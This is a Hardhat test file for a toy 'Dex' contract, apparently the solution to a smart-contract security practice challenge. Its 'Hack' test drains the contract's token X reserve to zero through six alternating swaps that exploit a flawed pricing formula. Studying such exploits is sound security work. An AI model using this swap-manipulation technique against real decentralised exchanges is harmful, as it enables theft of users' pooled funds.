const { assert, expect } = require("chai")
const { deployments, getNamedAccounts, ethers } = require("hardhat")
const { deploy } = deployments

describe("Dex Test", () => {
    let dex, deployer, hacker, tokenX, tokenY

    beforeEach(async () => {
        const accounts = await ethers.getSigners()
        deployer = accounts[0]
        hacker = accounts[1]

        await deploy("Dex", {
            from: deployer.address,
            args: [],
        })

        const dexContract = await ethers.getContract("Dex")
        dex = dexContract.connect(deployer)

        tokenX = await deploy("SwappableToken", {
            from: deployer.address,
            args: [dex.address, "Xe", "X", "110"],
        })
        tokenY = await deploy("SwappableToken", {
            from: deployer.address,
            args: [dex.address, "Ye", "Y", "110"],
        })

        await dex.setTokens(tokenX.address, tokenY.address)
        await dex.approve(dex.address, "1000")
        await dex.addLiquidity(tokenX.address, "100")
        await dex.addLiquidity(tokenY.address, "100")
    })
    describe("Let's Check the initiated things  ", () => {
        it("Checks the balance of token X and token Y in contract", async () => {
            const balOfX = await dex.balanceOf(tokenX.address, dex.address)
            const balOfY = await dex.balanceOf(tokenY.address, dex.address)
            assert.equal(balOfX.toString(), "100")
            assert.equal(balOfY.toString(), "100")
        })
        it("Checks the player has 10 Tokens (Taking deployer as the player)", async () => {
            const balOfX = await dex.balanceOf(tokenX.address, deployer.address)
            const balOfY = await dex.balanceOf(tokenY.address, deployer.address)
            assert.equal(balOfX.toString(), "10")
            assert.equal(balOfY.toString(), "10")
        })
    })
    describe("Let's down the balance of tokenX of contract to 0", () => {
        it("Hack", async () => {
            tX = tokenX.address
            tY = tokenY.address
            await dex.swap(tX, tY, 10)
            await dex.swap(tY, tX, 20)
            await dex.swap(tX, tY, 24)
            await dex.swap(tY, tX, 30)
            await dex.swap(tX, tY, 41)
            await dex.swap(tY, tX, 45)
            const balOfX = await dex.balanceOf(tokenX.address, dex.address)
            assert.equal(balOfX.toString(), 0)
        })
    })
})
